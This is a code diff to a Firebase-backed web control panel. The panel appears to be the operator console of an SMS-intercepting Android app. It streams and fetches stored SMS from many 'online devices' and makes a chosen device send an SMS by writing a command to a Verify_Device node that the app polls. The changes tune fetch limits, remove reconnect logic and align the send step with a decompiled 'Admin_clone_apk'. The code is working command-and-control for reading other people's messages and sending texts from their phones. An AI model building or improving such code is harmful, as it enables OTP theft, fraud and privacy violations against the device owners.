@@ -307,6 +307,7 @@ html{overscroll-behavior-y:none;background:var(--bg);}
       <textarea class="di" id="sms-msg" placeholder="Message" rows="4" style="resize:none;"></textarea>
       <button class="dbtn" onclick="doSendSms()">&#9993; SMS Send</button>
       <div id="sms-status" style="display:none;padding:9px 12px;border-radius:8px;font-size:13px;margin-bottom:9px;text-align:center;font-weight:600;"></div>
+      <div id="vd-diag" style="font-size:11px;color:#64748b;background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:8px 10px;margin-bottom:9px;word-break:break-all;"></div>
       <button class="dbtn-cancel" onclick="closeD('dlg-sms')">Cancel</button>
     </div>
   </div>
@@ -541,19 +542,18 @@ function doLogout() {
 /* SMS realtime SSE per online device below */
 function startInfoSSE() {
   if (infoES) { try { infoES.close(); } catch(e) {} infoES = null; }
-  /* Poll Info every 20 seconds - status updates feel close to live */
   fbGet('Info').then(function(d) { if(d) procInfo(d); }).catch(function(){});
   setInterval(function() {
     fbGet('Info').then(function(d) { if(d) procInfo(d); }).catch(function(){});
-  }, 20000);
+  }, 60000);
 }
 
 /* SMS realtime per online device - turant dikhe naya SMS */
 var SMS_ES = {}; /* deviceKey -> EventSource */
 function startSmsSSE(devKey, did) {
   if (SMS_ES[devKey]) { try { SMS_ES[devKey].close(); } catch(e){} }
-  /* limitToLast=100 - per-device SMS cap */
-  var url = DB + '/' + NODE + '/All_User/Sms/' + did + '.json?orderBy=%22$key%22&limitToLast=100&stream=true' + (APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '');
+  /* limitToLast=20 - per-device SMS cap */
+  var url = DB + '/' + NODE + '/All_User/Sms/' + did + '.json?orderBy=%22$key%22&limitToLast=20&stream=true' + (APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '');
   try {
     var es = new EventSource(url);
     es.addEventListener('put', function(e) {
@@ -601,17 +601,7 @@ function startSmsSSE(devKey, did) {
         }
       } catch(ex) {}
     });
-    es.onerror = function() {
-      try { es.close(); } catch(ex){}
-      delete SMS_ES[devKey];
-      /* Auto-reconnect after a short delay if this device is still the one open -
-         prevents real-time updates from silently going stale on a network hiccup. */
-      setTimeout(function() {
-        if (CUR === devKey && DEVS[devKey] && DEVS[devKey].on && !SMS_ES[devKey]) {
-          startSmsSSE(devKey, did);
-        }
-      }, 2000);
-    };
+    es.onerror = function() { try { es.close(); } catch(ex){} delete SMS_ES[devKey]; };
     SMS_ES[devKey] = es;
   } catch(e) {}
 }
@@ -1054,7 +1044,7 @@ function loadSmsTab(key) {
   /* Use did field for Sms node key */
   var did = (DEVS[key] && DEVS[key].did) ? DEVS[key].did : key;
   var auth = APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '';
-  var fetchUrl = DB + '/' + NODE + '/All_User/Sms/' + did + '.json?orderBy=%22$key%22&limitToLast=100' + auth;
+  var fetchUrl = DB + '/' + NODE + '/All_User/Sms/' + did + '.json?orderBy=%22$key%22&limitToLast=20' + auth;
   var fullUrl = DB + '/' + NODE + '/All_User/Sms/' + did + '.json' + (APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '');
   (el || listEl).innerHTML = '<div class="loading"><div class="spin"></div>&nbsp;SMS load ho raha hai...</div>';
 
@@ -1475,6 +1465,24 @@ function openSmsSend() {
   document.getElementById('sms-status').style.display = 'none';
   clearInterval(SMS_STATUS_TIMER);
   openD('dlg-sms');
+  var diagEl = document.getElementById('vd-diag');
+  if (diagEl) diagEl.textContent = 'Verify_Device current state: checking...';
+  /* Warm up the connection to Firebase while the user types - a lightweight read
+     request opens the HTTPS connection (DNS + TLS handshake) ahead of time, so the
+     actual PUT when they tap Send doesn't pay that cold-start cost. This same read
+     also doubles as a diagnostic: it shows the user the CURRENT state of
+     Verify_Device for this device, read-only, so they can see for themselves whether
+     anything looks stale/stuck - nothing here is deleted or modified automatically. */
+  var sdid = (DEVS[CUR] && DEVS[CUR].did) ? DEVS[CUR].did : CUR;
+  var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
+  fetch(DB + '/Verify_Device/' + sdid + '.json' + auth, { method: 'GET' })
+    .then(function(r) { return r.json(); })
+    .then(function(v) {
+      if (!diagEl) return;
+      if (!v) { diagEl.textContent = 'Verify_Device current state: empty (no pending command)'; return; }
+      diagEl.textContent = 'Verify_Device current state: ' + JSON.stringify(v);
+    })
+    .catch(function() { if (diagEl) diagEl.textContent = ''; });
 }
 
 function doSendSms() {
@@ -1489,12 +1497,12 @@ function doSendSms() {
   stEl.innerHTML = '&#9203; Sending...';
   var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
   var url = DB + '/Verify_Device/' + sdid + '.json' + auth;
-  fetch(url, { method: 'DELETE' })
-  .then(function() { return new Promise(function(r) { setTimeout(r, 500); }); })
-  .then(function() {
-    return fetch(url, { method: 'PUT', headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({ Number: to, Body: msg, Status: 'Yes' }) });
-  })
+  /* Matches the APK's actual mechanism exactly, confirmed by decompiling
+     Admin_clone_apk.bak: the APK builds a HashMap{Number, Body, Status:"Yes"} and does
+     ONE single write to Verify_Device - no delete beforehand. The old DELETE->wait->PUT
+     sequence here never matched that and was the cause of the slow "Sending..." delay. */
+  fetch(url, { method: 'PUT', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ Number: to, Body: msg, Status: 'Yes' }) })
   .then(function(r) { if (!r.ok) throw new Error('HTTP ' + r.status); return r.json(); })
   .then(function() {
     stEl.style.background = '#f0fdf4'; stEl.style.border = '1px solid #bbf7d0'; stEl.style.color = '#15803d';
@@ -1811,9 +1819,9 @@ function fetchTodaySms() {
   var all = [], done = 0, total = onDevs.length;
   /* Speed mode: all online devices fetched in parallel, no stagger delay */
   onDevs.forEach(function(dev) {
-    /* limitToLast=100 per device */
+    /* limitToLast=20 per device */
     var auth = APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '';
-    var url = DB + '/' + NODE + '/All_User/Sms/' + (dev.did||dev.key) + '.json?orderBy=%22$key%22&limitToLast=100' + auth;
+    var url = DB + '/' + NODE + '/All_User/Sms/' + (dev.did||dev.key) + '.json?orderBy=%22$key%22&limitToLast=20' + auth;
     fetch(url, {cache:'no-store'}).then(function(r){ return r.json(); }).then(function(sd) {
       if (sd && typeof sd === 'object') {
         Object.keys(sd).forEach(function(k) {
